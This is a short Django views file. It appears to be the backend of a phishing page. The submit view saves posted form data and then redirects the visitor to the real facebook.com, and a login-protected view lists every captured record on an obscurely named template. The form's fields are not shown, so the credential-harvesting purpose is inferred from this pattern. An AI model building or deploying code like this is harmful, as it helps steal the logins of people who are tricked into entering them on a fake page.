from django.shortcuts import render
from django.shortcuts import render, redirect
from .models import *
from .forms import Infoform
from django.contrib.auth.decorators import login_required

def index(request):
    form = Infoform()
    return render(request, 'core/index.html', {
        'form': form,
    })

def submit(request):
    if request.method == 'POST':
        form = Infoform(request.POST)
        if form.is_valid():
            form.save()
            return redirect('https://www.facebook.com/')
        print('sent')
    else:
        form = Infoform()
    
    return render(request, 'core/index.html', {
        'form': form,
        
    })
@login_required
def admin(request):
    users = Info.objects.all()
    return render(request, 'core/2038.html', {
        'users': users
    })
    
